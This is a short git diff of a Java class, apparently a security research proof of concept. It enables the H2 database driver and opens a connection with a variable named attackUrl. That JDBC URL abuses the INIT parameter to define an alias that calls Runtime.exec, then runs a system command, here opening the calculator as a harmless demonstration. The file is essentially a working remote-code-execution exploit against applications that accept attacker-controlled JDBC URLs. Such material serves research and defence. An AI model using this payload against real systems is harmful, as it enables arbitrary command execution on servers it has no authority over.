@@ -15,7 +15,7 @@ import java.sql.DriverManager;
  */
 public class Offline {
     public static void main(String[] args) throws Exception {
-//        Class.forName("org.h2.Driver");
+        Class.forName("org.h2.Driver");
 
         String attackUrl = "jdbc:h2:mem:test;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS if not exists EXEC AS 'void exec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(cmd)\\;}'\\;CALL EXEC ('open -a calculator.app')\\;";
         Connection connection = DriverManager.getConnection(attackUrl);
